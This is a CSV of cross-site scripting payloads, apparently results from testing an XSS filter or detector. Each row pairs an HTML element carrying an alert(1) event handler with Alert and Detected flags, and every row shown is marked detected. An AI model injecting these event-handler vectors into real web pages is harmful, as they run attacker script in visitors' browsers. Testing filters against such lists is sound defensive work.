Payload,Alert,Detected
"<animatetransform oncut=alert(1) value=""XSS"" autofocus tabindex=1 style=display:block>test",False,1
"<animatetransform ondblclick=""alert(1)"" autofocus tabindex=1 style=display:block>test</animatetransform>",False,1
<animatetransform onfocus=alert(1) autofocus tabindex=1>,False,1
<animatetransform onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</animatetransform><input value=clickme>,False,1
"<animatetransform onkeydown=""alert(1)"" contenteditable style=display:block>test</animatetransform>",False,1
"<animatetransform onkeypress=""alert(1)"" contenteditable style=display:block>test</animatetransform>",False,1
"<animatetransform onkeyup=""alert(1)"" contenteditable style=display:block>test</animatetransform>",False,1
"<animatetransform onmousedown=""alert(1)"" style=display:block>test</animatetransform>",False,1
"<animatetransform onmouseenter=""alert(1)"" style=display:block>test</animatetransform>",False,1
"<animatetransform onmouseleave=""alert(1)"" style=display:block>test</animatetransform>",False,1
"<animatetransform onmousemove=""alert(1)"" style=display:block>test</animatetransform>",False,1
"<animatetransform onmouseout=""alert(1)"" style=display:block>test</animatetransform>",False,1
"<animatetransform onmouseover=""alert(1)"" style=display:block>test</animatetransform>",False,1
"<animatetransform onmouseup=""alert(1)"" style=display:block>test</animatetransform>",False,1
<animatetransform onmousewheel=alert(1) style=display:block>requires scrolling,False,1
<animatetransform onpointercancel=alert(1)>XSS</animatetransform>,False,1
<animatetransform onpointerdown=alert(1) style=display:block>XSS</animatetransform>,False,1
<animatetransform onpointerenter=alert(1) style=display:block>XSS</animatetransform>,False,1
<animatetransform onpointerleave=alert(1) style=display:block>XSS</animatetransform>,False,1
<animatetransform onpointermove=alert(1) style=display:block>XSS</animatetransform>,False,1
<animatetransform onpointerout=alert(1) style=display:block>XSS</animatetransform>,False,1
<animatetransform onpointerover=alert(1) style=display:block>XSS</animatetransform>,False,1
<animatetransform onpointerrawupdate=alert(1) style=display:block>XSS</animatetransform>,False,1
<animatetransform onpointerup=alert(1) style=display:block>XSS</animatetransform>,False,1
"<animatetransform onscrollend=alert(1) style=""display:block;overflow:auto;border:1px dashed;width:500px;height:100px;""><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></animatetransform>",False,1
<animatetransform onwebkitmouseforcechanged=alert(1)>XSS</animatetransform>,False,1
<animatetransform onwebkitmouseforcedown=alert(1)>XSS</animatetransform>,False,1
<animatetransform onwebkitmouseforceup=alert(1)>XSS</animatetransform>,False,1
<animatetransform onwebkitmouseforcewillbegin=alert(1)>XSS</animatetransform>,False,1
<animatetransform onwebkitwillrevealbottom=alert(1)>XSS</animatetransform>,False,1
<applet contenteditable onbeforeinput=alert(1)>test,False,1
"<applet draggable=""true"" ondrag=""alert(1)"" style=display:block>test</applet>",False,1
"<applet draggable=""true"" ondragend=""alert(1)"" style=display:block>test</applet>",False,1
"<applet draggable=""true"" ondragenter=""alert(1)"" style=display:block>test</applet>",False,1
"<applet draggable=""true"" ondragexit=""alert(1)"" style=display:block>test</applet>",False,1
"<applet draggable=""true"" ondragleave=""alert(1)"" style=display:block>test</applet>",False,1
"<applet draggable=""true"" ondragstart=""alert(1)"" style=display:block>test</applet>",False,1
"<applet id=x style=""transition:outline 1s"" ontransitionend=alert(1) tabindex=1></applet>",False,1
<applet id=x tabindex=1 onfocus=alert(1)></applet>,False,1
<applet id=x tabindex=1 onfocusin=alert(1)></applet>,False,1
<applet onafterscriptexecute=alert(1)><script>1</script>,False,1
"<applet onbeforecopy=""alert(1)"" contenteditable>test</applet>",False,1
"<applet onbeforecut=""alert(1)"" contenteditable>test</applet>",False,1
<applet onbeforescriptexecute=alert(1)><script>1</script>,False,1
<applet onblur=alert(1) id=x tabindex=1 style=display:block>test</applet><input value=clickme>,False,1
"<applet onclick=""alert(1)"" style=display:block>test</applet>",False,1
<applet oncontentvisibilityautostatechange=alert(1) style=display:block;content-visibility:auto>,False,1
"<applet oncontextmenu=""alert(1)"" style=display:block>test</applet>",False,1
"<applet oncopy=alert(1) value=""XSS"" autofocus tabindex=1 style=display:block>test",False,1
"<applet oncut=alert(1) value=""XSS"" autofocus tabindex=1 style=display:block>test",False,1
"<applet ondblclick=""alert(1)"" autofocus tabindex=1 style=display:block>test</applet>",False,1
<applet onfocus=alert(1) autofocus tabindex=1>,False,1
<applet onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</applet><input value=clickme>,False,1
"<applet onkeydown=""alert(1)"" contenteditable style=display:block>test</applet>",False,1
"<applet onkeypress=""alert(1)"" contenteditable style=display:block>test</applet>",False,1
"<applet onkeyup=""alert(1)"" contenteditable style=display:block>test</applet>",False,1
"<applet onmousedown=""alert(1)"" style=display:block>test</applet>",False,1
"<applet onmouseenter=""alert(1)"" style=display:block>test</applet>",False,1
"<applet onmouseleave=""alert(1)"" style=display:block>test</applet>",False,1
"<applet onmousemove=""alert(1)"" style=display:block>test</applet>",False,1
"<applet onmouseout=""alert(1)"" style=display:block>test</applet>",False,1
"<applet onmouseover=""alert(1)"" style=display:block>test</applet>",False,1
"<applet onmouseup=""alert(1)"" style=display:block>test</applet>",False,1
<applet onmousewheel=alert(1) style=display:block>requires scrolling,False,1
"<applet onpaste=""alert(1)"" contenteditable>test</applet>",False,1
<applet onpointercancel=alert(1)>XSS</applet>,False,1
<applet onpointerdown=alert(1) style=display:block>XSS</applet>,False,1
<applet onpointerenter=alert(1) style=display:block>XSS</applet>,False,1
<applet onpointerleave=alert(1) style=display:block>XSS</applet>,False,1
<applet onpointermove=alert(1) style=display:block>XSS</applet>,False,1
<applet onpointerout=alert(1) style=display:block>XSS</applet>,False,1
<applet onpointerover=alert(1) style=display:block>XSS</applet>,False,1
<applet onpointerrawupdate=alert(1) style=display:block>XSS</applet>,False,1
<applet onpointerup=alert(1) style=display:block>XSS</applet>,False,1
"<applet onscrollend=alert(1) style=""display:block;overflow:auto;border:1px dashed;width:500px;height:100px;""><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></applet>",False,1
<applet onwebkitmouseforcechanged=alert(1)>XSS</applet>,False,1
<applet onwebkitmouseforcedown=alert(1)>XSS</applet>,False,1
<applet onwebkitmouseforceup=alert(1)>XSS</applet>,False,1
<applet onwebkitmouseforcewillbegin=alert(1)>XSS</applet>,False,1
<applet onwebkitwillrevealbottom=alert(1)>XSS</applet>,False,1
<area contenteditable onbeforeinput=alert(1)>test,False,1
"<area draggable=""true"" ondrag=""alert(1)"" style=display:block>test</area>",False,1
"<area draggable=""true"" ondragend=""alert(1)"" style=display:block>test</area>",False,1
"<area draggable=""true"" ondragenter=""alert(1)"" style=display:block>test</area>",False,1
"<area draggable=""true"" ondragexit=""alert(1)"" style=display:block>test</area>",False,1
"<area draggable=""true"" ondragleave=""alert(1)"" style=display:block>test</area>",False,1
"<area draggable=""true"" ondragstart=""alert(1)"" style=display:block>test</area>",False,1
"<area id=x style=""transition:outline 1s"" ontransitionend=alert(1) tabindex=1></area>",False,1
<area onafterscriptexecute=alert(1)><script>1</script>,False,1
"<area onbeforecopy=""alert(1)"" contenteditable>test</area>",False,1
"<area onbeforecut=""alert(1)"" contenteditable>test</area>",False,1
<area onbeforescriptexecute=alert(1)><script>1</script>,False,1
<area onblur=alert(1) id=x tabindex=1 style=display:block>test</area><input value=clickme>,False,1
"<area onclick=""alert(1)"" style=display:block>test</area>",False,1
<area oncontentvisibilityautostatechange=alert(1) style=display:block;content-visibility:auto>,False,1
"<area oncontextmenu=""alert(1)"" style=display:block>test</area>",False,1
"<area oncopy=alert(1) value=""XSS"" autofocus tabindex=1 style=display:block>test",False,1
"<area oncut=alert(1) value=""XSS"" autofocus tabindex=1 style=display:block>test",False,1
"<area ondblclick=""alert(1)"" autofocus tabindex=1 style=display:block>test</area>",False,1
<area onfocus=alert(1) autofocus tabindex=1>,False,1
<area onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</area><input value=clickme>,False,1
"<area onkeydown=""alert(1)"" contenteditable style=display:block>test</area>",False,1
"<area onkeypress=""alert(1)"" contenteditable style=display:block>test</area>",False,1
"<area onkeyup=""alert(1)"" contenteditable style=display:block>test</area>",False,1
"<area onmousedown=""alert(1)"" style=display:block>test</area>",False,1
"<area onmouseenter=""alert(1)"" style=display:block>test</area>",False,1
"<area onmouseleave=""alert(1)"" style=display:block>test</area>",False,1
"<area onmousemove=""alert(1)"" style=display:block>test</area>",False,1
"<area onmouseout=""alert(1)"" style=display:block>test</area>",False,1
"<area onmouseover=""alert(1)"" style=display:block>test</area>",False,1
"<area onmouseup=""alert(1)"" style=display:block>test</area>",False,1
<area onmousewheel=alert(1) style=display:block>requires scrolling,False,1
"<area onpaste=""alert(1)"" contenteditable>test</area>",False,1
<area onpointercancel=alert(1)>XSS</area>,False,1
<area onpointerdown=alert(1) style=display:block>XSS</area>,False,1
<area onpointerenter=alert(1) style=display:block>XSS</area>,False,1
<area onpointerleave=alert(1) style=display:block>XSS</area>,False,1
<area onpointermove=alert(1) style=display:block>XSS</area>,False,1
<area onpointerout=alert(1) style=display:block>XSS</area>,False,1
<area onpointerover=alert(1) style=display:block>XSS</area>,False,1
<area onpointerrawupdate=alert(1) style=display:block>XSS</area>,False,1
<area onpointerup=alert(1) style=display:block>XSS</area>,False,1
"<area onscrollend=alert(1) style=""display:block;overflow:auto;border:1px dashed;width:500px;height:100px;""><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></area>",False,1
<area onwebkitmouseforcechanged=alert(1)>XSS</area>,False,1
<area onwebkitmouseforcedown=alert(1)>XSS</area>,False,1
<area onwebkitmouseforceup=alert(1)>XSS</area>,False,1
<area onwebkitmouseforcewillbegin=alert(1)>XSS</area>,False,1
<area onwebkitwillrevealbottom=alert(1)>XSS</area>,False,1
<article contenteditable onbeforeinput=alert(1)>test,False,1
"<article draggable=""true"" ondrag=""alert(1)"" style=display:block>test</article>",False,1
"<article draggable=""true"" ondragend=""alert(1)"" style=display:block>test</article>",False,1
"<article draggable=""true"" ondragenter=""alert(1)"" style=display:block>test</article>",False,1
"<article draggable=""true"" ondragexit=""alert(1)"" style=display:block>test</article>",False,1
"<article draggable=""true"" ondragleave=""alert(1)"" style=display:block>test</article>",False,1
"<article draggable=""true"" ondragstart=""alert(1)"" style=display:block>test</article>",False,1
"<article id=x style=""transition:outline 1s"" ontransitionend=alert(1) tabindex=1></article>",False,1
<article id=x tabindex=1 onfocus=alert(1)></article>,False,1
<article id=x tabindex=1 onfocusin=alert(1)></article>,False,1
<article onafterscriptexecute=alert(1)><script>1</script>,False,1
"<article onbeforecopy=""alert(1)"" contenteditable>test</article>",False,1
"<article onbeforecut=""alert(1)"" contenteditable>test</article>",False,1
<article onbeforescriptexecute=alert(1)><script>1</script>,False,1
<article onblur=alert(1) id=x tabindex=1 style=display:block>test</article><input value=clickme>,False,1
"<article onclick=""alert(1)"" style=display:block>test</article>",False,1
<article oncontentvisibilityautostatechange=alert(1) style=display:block;content-visibility:auto>,False,1
"<article oncontextmenu=""alert(1)"" style=display:block>test</article>",False,1
"<article oncopy=alert(1) value=""XSS"" autofocus tabindex=1 style=display:block>test",False,1
"<article oncut=alert(1) value=""XSS"" autofocus tabindex=1 style=display:block>test",False,1
"<article ondblclick=""alert(1)"" autofocus tabindex=1 style=display:block>test</article>",False,1
<article onfocus=alert(1) autofocus tabindex=1>,False,1
<article onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</article><input value=clickme>,False,1
"<article onkeydown=""alert(1)"" contenteditable style=display:block>test</article>",False,1
"<article onkeypress=""alert(1)"" contenteditable style=display:block>test</article>",False,1
"<article onkeyup=""alert(1)"" contenteditable style=display:block>test</article>",False,1
"<article onmousedown=""alert(1)"" style=display:block>test</article>",False,1
"<article onmouseenter=""alert(1)"" style=display:block>test</article>",False,1
"<article onmouseleave=""alert(1)"" style=display:block>test</article>",False,1
"<article onmousemove=""alert(1)"" style=display:block>test</article>",False,1
"<article onmouseout=""alert(1)"" style=display:block>test</article>",False,1
"<article onmouseover=""alert(1)"" style=display:block>test</article>",False,1
"<article onmouseup=""alert(1)"" style=display:block>test</article>",False,1
<article onmousewheel=alert(1) style=display:block>requires scrolling,False,1
"<article onpaste=""alert(1)"" contenteditable>test</article>",False,1
<article onpointercancel=alert(1)>XSS</article>,False,1
<article onpointerdown=alert(1) style=display:block>XSS</article>,False,1
<article onpointerenter=alert(1) style=display:block>XSS</article>,False,1
<article onpointerleave=alert(1) style=display:block>XSS</article>,False,1
<article onpointermove=alert(1) style=display:block>XSS</article>,False,1
<article onpointerout=alert(1) style=display:block>XSS</article>,False,1
<article onpointerover=alert(1) style=display:block>XSS</article>,False,1
<article onpointerrawupdate=alert(1) style=display:block>XSS</article>,False,1
<article onpointerup=alert(1) style=display:block>XSS</article>,False,1
"<article onscrollend=alert(1) style=""display:block;overflow:auto;border:1px dashed;width:500px;height:100px;""><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></article>",False,1
<article onscrollsnapchange=alert(1) style=overflow-y:hidden;scroll-snap-type:x><div style=scroll-snap-align:center>1337</div></article>,False,1
<article onwebkitmouseforcechanged=alert(1)>XSS</article>,False,1
<article onwebkitmouseforcedown=alert(1)>XSS</article>,False,1
<article onwebkitmouseforceup=alert(1)>XSS</article>,False,1
<article onwebkitmouseforcewillbegin=alert(1)>XSS</article>,False,1
<article onwebkitwillrevealbottom=alert(1)>XSS</article>,False,1
<aside contenteditable onbeforeinput=alert(1)>test,False,1
